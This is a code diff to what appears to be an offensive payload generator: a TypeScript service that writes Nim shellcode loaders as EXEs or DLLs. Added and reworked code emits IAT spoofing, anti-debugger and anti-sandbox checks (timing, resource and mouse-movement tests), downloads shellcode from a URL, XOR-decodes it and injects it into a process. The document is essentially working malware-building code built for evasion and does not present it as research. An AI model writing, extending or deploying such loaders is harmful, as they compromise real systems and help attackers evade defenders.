@@ -28,6 +28,38 @@ export class PayloadService {
         const shellcodeBlock = this.generateShellcodeBlock(config);
         const mainLogic = this.generateMainLogic(config);
 
+        let entryPoint = '';
+        if (config.output === 'exe') {
+            entryPoint = `
+proc main() =
+${mainLogic.split('\n').map(line => line.trim() === '' ? '' : '    ' + line).join('\n')}
+
+main()
+`;
+        } else {
+            const exportName = config.export_function_name || 'DllMain';
+            if (exportName === 'DllMain') {
+                entryPoint = `
+proc DllMain*(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall, exportc, dynlib.} =
+    NimMain()
+    if fdwReason == DLL_PROCESS_ATTACH:
+${mainLogic.split('\n').map(line => line.trim() === '' ? '' : '        ' + line).join('\n')}
+    return true
+`;
+            } else {
+                entryPoint = `
+proc ${exportName}*() {.stdcall, exportc, dynlib.} = 
+    NimMain()
+${mainLogic.split('\n').map(line => line.trim() === '' ? '' : '    ' + line).join('\n')}
+
+# Optional: Still provide a DllMain for basic initialization if needed
+proc DllMain*(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall, exportc, dynlib.} =
+    NimMain()
+    return true
+`;
+            }
+        }
+
         return `
 import ${imports.join(', ')}
 
@@ -45,10 +77,10 @@ ${injectionProc}
 
 ${shellcodeBlock}
 
-proc main() =
-${mainLogic}
+# Forward declaration for Nim runtime initialization
+proc NimMain() {.cdecl, importc.}
 
-main()
+${entryPoint}
 `;
     }
 
@@ -690,66 +722,55 @@ proc NtWriteVirtualMemory(ProcessHandle: HANDLE, BaseAddress: PVOID, Buffer: PVO
 
         // 0. IAT Spoofing - populate IAT with benign functions
         if (config.iat_spoofing.length > 0) {
-            code += `
-    populateIAT()
-`;
+            code += "populateIAT()\n";
         }
 
         // 1. Anti-Debug Checks
         if (config.anti_debug.includes('is_debugger_present')) {
-            code += `
-    if IsDebuggerPresent(): quit(0)
-    if pebBeingDebugged(): quit(0)
-`;
-        }
-        if (config.anti_debug.includes('nt_global_flag')) {
-            // Placeholder if implemented later
+            code += "if IsDebuggerPresent(): quit(0)\nif pebBeingDebugged(): quit(0)\n";
         }
 
         // 2. Anti-Sandbox Checks
         if (config.anti_sandbox.length > 0) {
-            code += `    echo "[*] Performing sandbox checks..."\n`;
+            code += 'echo "[*] Performing sandbox checks..."\n';
             if (config.anti_sandbox.includes('timing')) {
-                code += `    if not sleepObfuscation(): quit(0)\n`;
+                code += "if not sleepObfuscation(): quit(0)\n";
             }
             if (config.anti_sandbox.includes('cpu_ram')) {
-                code += `    if not checkResources(): quit(0)\n`;
+                code += "if not checkResources(): quit(0)\n";
             }
             if (config.anti_sandbox.includes('human_behavior')) {
-                code += `    if not checkMouseMovement(): quit(0)\n`;
+                code += "if not checkMouseMovement(): quit(0)\n";
             }
         }
 
         // 3. Shellcode Retrieval
         if (config.shellcode_url) {
             code += `
-    let shellcodeStr = extractShellCodeWithHttp()
-    if shellcodeStr.len == 0: quit(0)
-    var shellcodeByte: seq[byte] = toByteSeq(shellcodeStr)
+let shellcodeStr = extractShellCodeWithHttp()
+if shellcodeStr.len == 0: quit(0)
+var shellcodeByte: seq[byte] = toByteSeq(shellcodeStr)
 `;
         } else {
-            // For raw shellcode, 'shellcode' array is already global, convert to seq for uniformity if needed
-            // or just cast logic. But 'xor' expects seq usually.
             code += `
-    # Convert array to seq for easier handling
-    var shellcodeByte = @shellcode
+# Convert array to seq for easier handling
+var shellcodeByte = @shellcode
 `;
         }
 
         // 4. XOR Decryption
         if (config.xor_key) {
-            // Parse key string "0xDE,0xAD" -> seq[byte]
             const keyBytes = config.xor_key.split(',').map(s => s.trim());
             code += `
-    let xorKeyMulti: seq[byte] = @[${keyBytes.map(k => `${k}'u8`).join(', ')}]
-    var finalShellcode = xorDecodeMulti(shellcodeByte, xorKeyMulti)
+let xorKeyMulti: seq[byte] = @[${keyBytes.map(k => `${k}'u8`).join(', ')}]
+var finalShellcode = xorDecodeMulti(shellcodeByte, xorKeyMulti)
 `;
         } else {
-            code += `    var finalShellcode = shellcodeByte\n`;
+            code += "var finalShellcode = shellcodeByte\n";
         }
 
         // 5. Injection
-        code += `    injectShellcode(finalShellcode)\n`;
+        code += "injectShellcode(finalShellcode)\n";
 
         return code;
     }
